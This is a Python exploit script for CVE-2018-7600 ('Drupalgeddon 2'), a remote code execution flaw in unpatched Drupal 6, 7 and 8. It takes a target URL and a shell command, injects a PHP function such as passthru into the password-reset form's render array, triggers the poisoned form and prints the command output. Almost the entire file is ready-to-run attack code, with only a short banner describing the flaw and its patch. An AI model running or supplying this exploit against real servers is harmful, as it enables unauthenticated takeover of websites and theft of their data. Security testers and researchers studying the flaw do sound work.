#!/usr/bin/python3 

import requests
import argparse
from bs4 import BeautifulSoup
def cve_banner():
    banner = r"""
############################################################
#   CVE-2018-7600 - Drupalgeddon 2                        #
#                                                          #
#   Description:                                           #
#   Remote Code Execution vulnerability in Drupal          #
#   Affects: Drupal 6.x, 7.x, 8.x (prior to patch)         #
#                                                          #
#   Severity: Critical                                     #
#   Impact: Allows unauthenticated attackers to execute    #
#           arbitrary code on the server.                  #
#                                                          #
#   Solution: Update Drupal to the latest patched version. #
#                                                          #
#   Written by: Muhammad Abid UR Rehman                    #
############################################################
"""
    print(banner)

def args():
    parser = argparse.ArgumentParser(description="CVE-2018-7600 Exploit Script")
    parser.add_argument("-t", "--target", help="Target URL (http://targetip:port)", required=True)
    parser.add_argument("-c", "--cmd", default="id",help="Command to execute like whoami,id or any", required=True)
    parser.add_argument("-f", "--function", help="Function to execute (default: 'passthru')", default='passthru')
    parser.add_argument("-p", "--proxy", help="Proxy to use (http://proxy:port)", default=None)
    args = parser.parse_args()
    if not args.target.startswith(('http://', 'https://')):
        print("Target URL must start with http:// or https://")
        exit(1)
    if not args.cmd:
        print("Command to execute is required.")
        exit(1)
    if not args.function:
        print("Function to execute is required. Defaulting to 'exec'.")
        args.function = 'exec'
    if args.proxy and not args.proxy.startswith(('http://', 'https://')):
        print("Proxy must start with http:// or https://")
        exit(1) 
    return args

def exploit(target, cmd, function , proxy):
    requests.packages.urllib3.disable_warnings()  # Disable SSL warnings
    proxies = {'http': proxy, 'https': proxy}
    print("Poisoning the Form ID to execute command on target: " + target)
    get = {'q':'user/password', 'name[#post_render][]':function, 'name[#type]':'markup', 'name[#markup]': cmd}
    post = {'form_id':'user_pass', '_triggering_element_name':'name', '_triggering_element_value':'', 'opz':'E-mail new Password'}
    response = requests.post(target, params=get, data=post, verify=False ,proxies=proxies if proxy else None)
    soup = BeautifulSoup(response.text, 'html.parser')
    try:
        form = soup.find('form', {'id': 'user-pass'})
        form_build_id = form.find('input', {'name': 'form_build_id'}).get('value')
        if form_build_id:
            print('[Infected  Form ID: ' + form_build_id)
            print('Command to execute: ' + cmd)
            get_params = {'q':'file/ajax/name/#value/' + form_build_id}
            post_params = {'form_build_id':form_build_id}
            response = requests.post(target, params=get_params, data=post_params, verify=False, proxies=proxies)
            result = response.text.split('[{"command":"settings"')[0]
            print(result)
        else:
            print(f"Failed to exploit {target}. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred: {e}")
    
if __name__ == "__main__":
    cve_banner()
    args = args()
    exploit(args.target, args.cmd, args.function, args.proxy if args.proxy else None)



#References: https://github.com/pimps/CVE-2018-7600 the original exploit
# I have made a replica of the original exploit with some modifications.